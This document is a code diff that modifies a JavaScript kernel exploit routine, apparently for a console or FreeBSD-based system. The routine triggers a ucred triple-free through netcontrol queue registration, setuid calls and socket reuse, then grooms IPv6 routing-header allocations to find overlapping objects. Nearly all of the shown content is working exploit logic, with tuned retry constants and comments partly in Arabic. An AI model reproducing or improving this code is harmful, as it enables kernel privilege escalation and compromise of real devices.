@@ -1390,13 +1390,13 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 32;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 10000;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT  = 2000;
 
 function trigger_ucred_triplefree() {
   var end = false;
 
-  // إعداد msgIov كما في الأصلي
+  // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
 
@@ -1405,75 +1405,71 @@ function trigger_ucred_triplefree() {
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
-    // 1) dummy socket → netcontrol register
+    // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-
-    // 2) close dummy
     close(new BigInt(dummy_socket));
 
-    // 3) allocate new ucred
+    // 2) allocate new ucred
     setuid(1);
 
-    // 4) reclaim fd
+    // 3) reclaim fd → uaf_socket
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
 
-    // 5) free previous ucred
+    // 4) free previous ucred
     setuid(1);
 
-    // 6) unregister → free file + ucred
+    // 5) unregister → free file + ucred
     write32(nc_clear_buf, uaf_socket);
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
-    // 7) restore cr_refcnt = 1
-    for (var i = 0; i < 32; i++) {
+    // 6) محاولة إصلاح refcount بشكل خفيف
+    for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
-      sched_yield();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
-      sched_yield(); // تعديل رقم 5
     }
 
-    // 8) double free أول مرة
+    // 7) double free أول مرة
     close(dup(new BigInt(uaf_socket)));
 
-    // 9) إيجاد التوأم
+    // 8) إيجاد التوأم
     end = find_twins();
     if (!end) {
-      twins[0] = -1; twins[1] = -1; // تعديل رقم 1
+      twins[0] = -1;
+      twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
 
     log('Triple freeing...');
 
-    // 10) free واحدة من التوأم
+    // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
+    // 10) انتظار refcount = 1 لكن بدون لوب مجنونة
     var count = 0;
-
-    // 11) loop لإعادة refcnt = 1
-    while (count < 10000) {
+    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       trigger_iov_recvmsg();
-      sched_yield();
 
-      write32(leak_rthdr.add(0x04), 0); // تعديل رقم 4
+      write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
-      if (read32(leak_rthdr) === 1) break;
+      if (read32(leak_rthdr) === 1)
+        break;
 
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
-      sched_yield();
 
       count++;
     }
 
-    if (count === 10000) {
-      twins[0] = -1; twins[1] = -1;
+    if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+      twins[0] = -1;
+      twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
@@ -1481,13 +1477,14 @@ function trigger_ucred_triplefree() {
 
     triplets[0] = twins[0];
 
-    // 12) triple free فعليًا
+    // 11) triple free فعليًا
     close(dup(new BigInt(uaf_socket)));
 
-    // 13) إيجاد triplet 1
+    // 12) إيجاد triplet 1
     triplets[1] = find_triplet(triplets[0], -1);
     if (triplets[1] === -1) {
-      twins[0] = -1; twins[1] = -1;
+      twins[0] = -1;
+      twins[1] = -1;
       write(new BigInt(iov_sock_1), tmp, 1);
       close(new BigInt(uaf_socket));
       end = false;
@@ -1496,10 +1493,11 @@ function trigger_ucred_triplefree() {
 
     write(new BigInt(iov_sock_1), tmp, 1);
 
-    // 14) إيجاد triplet 2
+    // 13) إيجاد triplet 2
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] === -1) {
-      twins[0] = -1; twins[1] = -1;
+      twins[0] = -1;
+      twins[1] = -1;
       close(new BigInt(uaf_socket));
       end = false;
       continue;
